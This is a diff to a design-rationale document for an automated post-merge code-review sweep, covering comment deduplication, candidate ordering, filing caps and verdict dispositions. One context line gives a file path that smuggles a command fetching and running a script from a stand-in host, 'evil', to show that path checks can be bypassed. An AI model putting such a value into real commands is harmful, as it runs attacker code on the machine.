@@ -187,6 +187,91 @@ untrusted path on a command line, and the three shape conditions (relative, `..`
 root) exclude no metacharacter at all. `src/x$(curl -s http://evil/sh|sh).ts` satisfies every one of
 them.
 
+## Why the dedup needs both halves, and why anchor-only is worse than none
+
+Without any dedup each thread's anchoring comment is judged **twice** — once keyed by its thread node
+id, once from the comment list — consuming two candidate slots and two filing slots, inflating
+`<found>`, and defeating idempotency because the two copies key differently.
+
+But matching on the `path`:`line` **anchor alone** is worse than not deduplicating at all.
+`review-threads-read` returns only each thread's *first* comment (`comments(first:1)`), so every
+**reply** shares its thread's anchor. An anchor-only match drops them all — silently, outside
+`<found>` and outside `<not-judged>`. A reply is very often *the* late-landing verdict this sweep
+exists to catch, so that rule would defeat the whole procedure while reporting a clean tally. Hence
+anchor **and** body, and hence the two comparisons rather than one.
+
+## Why the interleave, and what threads-first would cost
+
+Ordering the ingest threads-first would let 25 review threads exhaust the 25-candidate budget before
+a single pull-request-level or review-summary comment is reached. That anchorless class is exactly
+the shape an automated reviewer's post-merge verdict usually arrives in — so the finding the whole
+procedure exists to catch would be counted `past the candidate cap` on any pull request with an
+ordinary number of threads. Not a false clean (the run renders `Partial`), but the target finding
+discarded all the same. Alternating guarantees each source at least half of each budget while both
+have entries left, and the whole of it when one is empty.
+
+## The capacity cost of ordering the within-source dedup after the cap
+
+A within-source duplicate sitting inside the first 100 consumes a slot, so a genuine entry beyond the
+cap is counted `past the ingest cap` in its place. That is a **capacity** effect, correctly reported
+— the shortfall shows up as a non-zero `<not-judged>`, never as a silent drop. Reclaiming the slot by
+running that comparison before the cap would trade a reported shortfall for unbounded digest minting
+on an attacker-controlled surface, which is the worse of the two. The cross-source comparison has no
+such trade-off, which is why only it moves ahead of the cap.
+
+## Why `unverifiable` is a separate disposition from `verified-invalid`
+
+`verified-invalid` asserts *the source was read and the claim does not hold* — a factual claim about
+code. Applying it to a candidate whose source was never opened would record a verdict nobody reached:
+the same laundering-by-mislabel the procedure forbids at the tracker. `unverifiable` is still a
+disposition a candidate *takes*, so it sits inside `<found>` with the other three — but a run whose
+candidates were all `unverifiable` has verified nothing, which is why the clean gate tests it
+separately.
+
+## Why the filing cap is per pull request and not sweep-wide
+
+A sweep-wide bound was considered and dropped. The procedure executes once per pull request, so
+enforcing one would need the caller to carry a running total across invocations — machinery whose own
+failure modes (counting earlier runs' writes, permanently suppressing new filings) cost more than the
+bound was worth. The per-pull-request cap already stops one noisy pull request from flooding a
+tracker, which is what it was for.
+
+The `<already-filed>` skip is applied *before* the cap for a related reason: a survivor filed on an
+earlier run produces no tracker write, so counting it would let a re-run push a genuinely new
+survivor past the cap permanently — the record meant to prevent duplicates would instead suppress
+first-time filings.
+
+## Why the distiller dispatch is unconditional
+
+A "judge the small ones inline" shortcut would leave a non-empty ingest that raises no claim in no
+bucket at all: `<found>` zero, `<not-judged>` zero, the clean `absent` reason barred because a review
+*was* present, and every clean gate satisfied. That is the exact silent loss the `NOTHING ACTIONABLE`
+split exists to close, reopened on the other path. One dispatch per pull request is cheap; a
+discarded review is not.
+
+## Why Step 3 tags the anchor and not just the source id
+
+The distiller echoes back whatever the input carried. Tagging the id alone would make every returned
+block read `Anchor: none` and push every anchored candidate down the anchorless branch, where the
+procedure re-derives an anchor from untrusted claim text.
+
+## Why the surgery: this file exists so the fragment can stay short
+
+The fragment is read at slot-fire, in the caller's own context, **once per swept pull request**. On a
+fleet run over 21 merged rows, every line of it is paid 21 times — in the orchestrator that also
+holds the scoreboard and every in-flight row. So a paragraph that argues for a rule, rather than
+stating it, is a runtime cost with no runtime effect.
+
+That is not how this file was built. Across 26 audit rounds the fragment grew 181 → 696 lines, almost
+all of it justification written *in place* at the moment each finding was answered — the natural
+instinct, and the wrong one, because each such paragraph is locally reasonable and collectively a
+context tax on the very resource the procedure's own bounds exist to protect. A later pass moved that
+reasoning here, where it belongs, and left the fragment stating what to do.
+
+**The rule for anyone editing either file:** if removing a sentence from the fragment leaves a
+plausible-but-wrong next action, it is behaviour and it stays. If it only leaves a reader less
+convinced, it is rationale and it belongs here.
+
 ## Why verify-before-file is non-negotiable
 
 The C029 manual triage dropped roughly 60% of the reviewer's post-merge claims against the real
